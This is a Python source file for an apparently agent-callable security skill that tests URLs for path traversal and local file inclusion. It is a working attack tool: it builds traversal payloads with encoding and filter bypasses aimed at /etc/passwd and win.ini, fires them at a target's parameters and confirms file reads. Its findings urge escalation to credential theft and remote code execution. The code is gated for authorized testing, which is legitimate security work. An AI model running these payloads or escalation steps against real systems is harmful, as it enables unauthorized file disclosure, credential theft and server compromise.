"""Path-traversal / LFI testing — reading arbitrary files off the server through a path parameter.

check_path_traversal injects directory-traversal payloads (../../../etc/passwd and friends, plus the
classic url-encoded / double-encoded / dot-slash-stripping bypasses) into the file-style parameters
of a target and looks for an unmistakable file-content signature in the response (the /etc/passwd
`root:x:0:0:` line, or a Windows win.ini section header). A signature hit is a confirmed local file
read — a high-severity, cleanly payable class that often chains to RCE (log poisoning, /proc/self).
Active (sends crafted requests) so it is gated. Pure-stdlib (urllib), CI-safe, $0.
"""

from __future__ import annotations

import asyncio
import re
import urllib.error
import urllib.request
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from friday.skills.registry import skill

# (target file, content signature of a successful read, OS label). The signatures are specific
# enough that a match is a real file read, not an echo of our payload.
_TARGETS: list[tuple[str, re.Pattern[str], str]] = [
    ("etc/passwd", re.compile(r"root:.*?:0:0:", re.I), "linux"),
    ("windows/win.ini", re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]", re.I), "win"),
]

# Traversal encoders — each takes a depth and the target, returns one payload string. Covers the
# plain sequence plus the bypasses that beat naive ../ stripping and single-decode filters.
_ENCODERS = [
    lambda d, t: "../" * d + t,  # plain
    lambda d, t: "..%2f" * d + t,  # url-encoded slash
    lambda d, t: "%2e%2e%2f" * d + t,  # fully url-encoded
    lambda d, t: "%252e%252e%252f" * d + t,  # double-encoded (decoded twice on the server)
    lambda d, t: "....//" * d + t,  # collapses to ../ after one round of ../-stripping
]

# Parameter names that commonly carry a file path / include target.
_FILE_PARAMS = frozenset(
    {
        "file",
        "filename",
        "path",
        "page",
        "template",
        "document",
        "doc",
        "folder",
        "root",
        "pg",
        "style",
        "include",
        "inc",
        "view",
        "content",
        "name",
        "img",
        "image",
        "download",
        "read",
        "load",
        "conf",
        "config",
        "lang",
        "locale",
    }
)
# When the URL carries no file-looking param, append-test this small high-signal set (bounded).
_DEFAULT_APPEND = ("file", "page", "path", "template", "include", "document")


def _build_payloads() -> list[tuple[str, re.Pattern[str], str]]:
    """(payload, signature, os) tuples — absolute path + encoded traversals at two depths."""
    out: list[tuple[str, re.Pattern[str], str]] = []
    for target, sig, os_ in _TARGETS:
        out.append(("/" + target, sig, os_))  # absolute path (no traversal needed)
        for depth in (5, 8):
            for enc in _ENCODERS:
                out.append((enc(depth, target), sig, os_))
    return out


_PAYLOADS = _build_payloads()


def _with_param(url: str, param: str, value: str) -> str:
    parts = urlparse(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urlunparse(parts._replace(query=urlencode(q, safe="/.%")))


def _probe(url: str) -> tuple[int, str, str | None]:
    """(status, body, error) — a normal GET (traversal results come back in the body)."""
    req = urllib.request.Request(url, headers={"User-Agent": "sutra-lfi/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:  # noqa: S310 — authorized target
            return r.status, r.read(500_000).decode("utf-8", "replace"), None
    except urllib.error.HTTPError as e:
        try:
            body = e.read(500_000).decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            body = ""
        return e.code, body, None
    except (urllib.error.URLError, OSError) as e:
        return 0, "", str(e)[:160]


@skill(
    name="check_path_traversal",
    description=(
        "Test a URL for path traversal / local file inclusion (LFI) — reading arbitrary server "
        "files through a path parameter. Injects ../../../etc/passwd-style payloads (plus the "
        "url-encoded, double-encoded and ....// bypasses) into the file-style parameters and looks "
        "for a real file-content signature in the response (the /etc/passwd root line or a Windows "
        "win.ini header). A hit is a confirmed file read — high severity, often chains to RCE. "
        "Pass param= to test one parameter. Active (crafted requests) — authorized targets only."
    ),
    auto_confirm=False,  # sends crafted traversal payloads — gated
    timeout_s=90,
)
async def check_path_traversal(url: str, param: str = "") -> dict[str, Any]:
    """Probe a URL's file-style parameters for path traversal / LFI.

    url: the target URL (ideally one with a file param, e.g. https://x/view?page=home).
    param: optional single parameter to test; otherwise the URL's file-looking params are used,
        or a small common set is appended when none are present.
    """
    url = (url or "").strip()
    if not url:
        return {"error": "no url to test"}
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    existing = [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]
    if param.strip():
        candidates = [param.strip()]
    else:
        candidates = [p for p in existing if p.lower() in _FILE_PARAMS] or list(_DEFAULT_APPEND)

    def _run() -> tuple[list[dict[str, Any]], bool]:
        hits: list[dict[str, Any]] = []
        reachable = False
        for p in candidates:
            found = False
            for payload, sig, os_ in _PAYLOADS:
                test_url = _with_param(url, p, payload)
                status, body, err = _probe(test_url)
                if err is None:
                    reachable = True
                if body and sig.search(body):
                    m = sig.search(body)
                    hits.append(
                        {
                            "param": p,
                            "payload": payload,
                            "os": os_,
                            "status": status,
                            "evidence": (m.group(0) if m else "")[:120],
                            "test_url": test_url,
                        }
                    )
                    found = True
                    break  # this param is confirmed — stop hammering it
            if found:
                continue
        return hits, reachable

    hits, reachable = await asyncio.to_thread(_run)
    if not reachable:
        return {"error": f"could not reach {url}", "url": url}

    findings = [
        {
            "id": "path-traversal",
            "severity": "high",
            "matched_at": h["test_url"],
            "name": f"Path traversal / LFI via '{h['param']}'",
            "description": (
                f"The '{h['param']}' parameter reads arbitrary files: payload '{h['payload']}' "
                f"returned the {h['os']} target's contents (HTTP {h['status']}, matched "
                f"'{h['evidence']}'). Confirmed local file read — escalate to source disclosure, "
                "credential/config theft, or RCE (log poisoning, /proc/self/environ, PHP wrappers)."
            ),
            "curl": f"curl -s '{h['test_url']}'",
        }
        for h in hits
    ]

    return {
        "url": url,
        "tested_params": candidates,
        "hits": hits,
        "findings": findings,
        "vulnerable": bool(findings),
        "note": (
            "Confirmed by an exact file-content signature, so a hit is real. Escalate read access "
            "(config/creds, /proc/self/environ) and check for LFI→RCE before reporting impact."
        ),
    }
